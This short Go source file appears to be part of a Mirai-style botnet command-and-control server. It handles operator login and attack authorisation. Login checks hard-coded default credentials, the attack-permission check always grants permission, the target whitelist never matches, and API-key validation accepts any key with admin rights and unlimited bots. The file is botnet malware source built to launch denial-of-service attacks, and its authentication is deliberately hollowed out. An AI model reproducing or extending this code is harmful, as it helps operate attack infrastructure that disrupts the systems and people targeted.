package main;

type AccountInfo struct {
	username string
	maxBots  int
	admin    int
}

func TryLogin(username, password string) (bool, AccountInfo) {
	if username == DefaultUser && password == DefaultPass {
		return true, AccountInfo{
			username: username,
			maxBots:  -1,
			admin:    1,  
		}
	}
	return false, AccountInfo{}
}

func CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	return true, nil
}

func ContainsWhitelistedTargets(attack *Attack) bool {
	return false
}

func CheckApiCode(apikey string) (bool, AccountInfo) {
	return true, AccountInfo{
		username: DefaultUser,
		maxBots:  -1,
		admin:    1,  
	}
}